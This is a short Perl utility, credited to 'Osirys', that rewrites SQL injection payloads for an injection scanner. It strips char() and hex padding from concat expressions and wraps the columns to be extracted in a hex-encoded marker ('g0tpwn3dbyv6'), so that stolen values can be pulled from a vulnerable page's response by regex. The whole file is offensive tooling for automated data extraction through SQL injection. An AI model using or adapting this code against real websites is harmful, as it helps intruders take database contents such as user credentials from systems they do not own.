#!/usr/bin/perl

# SQL Injection strings modifier for an easy match by script (for scanners)
# Regular Expression to get the extracted data : /g0tpwn3dbyv6(.+)g0tpwn3dbyv6/
# Coded by Giovanni Buzzin, "Osirys"
# WebSite : www.y-osirys.com
# Contacts :
# me[at]y-osirys[dot]com
# osirys[at]autistici[dot]org

my(@columns,@imp_columns);
my $columns = 0;

$bug = "";

$bug =~ s/%20/ /g;
$bug =~ s/%28/(/g;
$bug =~ s/%29/)/g;
$bug =~ s/%2C/,/g;
$bug =~ s/, /,/g;

if ($bug =~ /concat(_ws|)\(.+\)/gi) {
    $ws = 1 if ($1 =~ /_ws/);
    while ($bug =~ /char\(([0-9]+)\)/g) {
        my $chr = $1;
        if ($bug =~ /,char\($chr\),/) {
            $bug =~ s/,char\($chr\),/,/g;
        }
        if ($bug =~ /\(char\($chr\),/) {
            $bug =~ s/char\($chr\),//g;
        }
        if ($bug =~ /,char\($chr\)\)/) {
            $bug =~ s/,char\($chr\)//g;
        }
    }
    while ($bug =~ /0x([a-zA-Z0-9]+)/g) {
        my $hex = "0x".$1;
        if ($bug =~ /,$hex,/) {
            $bug =~ s/,$hex,/,/g;
        }
        if ($bug =~ /\($hex,/) {
            $bug =~ s/$hex,//g;
        }
        if ($bug =~ /,$hex\)/) {
            $bug =~ s/,$hex//g;
        }
    }
    if ($bug =~ /,/) {
        if ($bug =~ /\(([0-9A-Za-z-_]+)\)/) {
            my $col = $1;
            $bug =~ s/$col/0x67307470776e336462797636,$col,0x67307470776e336462797636/;
        }
        else {
            while ($bug =~ /\(([0-9A-Za-z-_,]*)\)/g){
                $col = $1;
                $col =~ s/,/,0x3a,/g;
            }

            $bug =~ s/concat\((.+)\)/concat(0x67307470776e336462797636,$col,0x67307470776e336462797636)/ if ($ws != 1);
            $bug =~ s/concat_ws\((.+)\)/concat_ws(0x67307470776e336462797636,$col,0x67307470776e336462797636)/ if ($ws == 1);
        }
    }
    else {
        if ($bug =~ /\(([0-9A-Za-z-_]+)\)/) {
            my $col = $1;
            $bug =~ s/$col/0x67307470776e336462797636,$col,0x67307470776e336462797636/;
        }
    }
}
elsif ($bug !~ /concat/) {
    if ($bug =~ /,/) {
        while ($bug =~ /([0-9A-Za-z-_]+),/g){
            push(@columns,$1);
        }
        push(@columns,$1) if ($bug =~ /,([0-9A-Za-z-_]+)( |\+)/);
        foreach my $i(@columns) {
            $columns++;
            if (($i !~ /null/i)&&($i =~ /[0-9]*[a-zA-Z]+/)) {
                $detail = $i;
                push(@imp_columns,$detail);
            }
        }
        foreach my $i(@imp_columns) {
            $imp_col__ .= ",0x3a,".$i;
        }
        $imp_col__ =~ s/^,0x3a,//;
        $bug =~ s/$imp_columns[0]/concat(0x67307470776e336462797636,$imp_col__,0x67307470776e336462797636)/;
    }
    else {
        if ($bug =~ /select( |\+)([0-9A-Za-z-_]+)( |\+)/) {
            my $col = $2;
            $bug =~ s/$col/concat(0x67307470776e336462797636,$col,0x67307470776e336462797636)/;
        }
    }
}

$bug =~ s/ /+/g;
print "SQL INJ:\n[+] $bug\n";
